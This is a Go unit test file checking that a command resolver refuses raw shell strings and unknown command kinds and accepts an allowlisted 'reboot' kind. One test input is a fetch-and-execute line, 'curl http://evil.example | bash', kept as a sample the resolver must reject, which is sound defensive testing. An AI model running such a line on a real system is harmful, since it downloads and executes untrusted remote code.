package commands

import "testing"

func TestResolveRefusesShellString(t *testing.T) {
	_, result, ok := Resolve(map[string]any{
		"id":      "dddddddd-dddd-4ddd-8ddd-dddddddddddd",
		"kind":    "reboot",
		"command": "curl http://evil.example | bash",
	})
	if ok {
		t.Fatal("expected refusal")
	}
	if result.Status != "refused" {
		t.Fatalf("status %s", result.Status)
	}
}

func TestResolveAcceptsAllowlistedKind(t *testing.T) {
	command, _, ok := Resolve(map[string]any{
		"id":   "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa",
		"kind": "reboot",
	})
	if !ok || command.Kind != "reboot" {
		t.Fatalf("command %+v ok %v", command, ok)
	}
}

func TestResolveAllDropsUnknownKinds(t *testing.T) {
	accepted, refused := ResolveAll([]any{
		map[string]any{"id": "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa", "kind": "reboot"},
		map[string]any{"id": "ffffffff-ffff-4fff-8fff-ffffffffffff", "kind": "ssh", "command": "id"},
	})
	if len(accepted) != 1 || accepted[0].Kind != "reboot" {
		t.Fatalf("accepted %+v", accepted)
	}
	if len(refused) != 1 || refused[0].Status != "refused" {
		t.Fatalf("refused %+v", refused)
	}
}
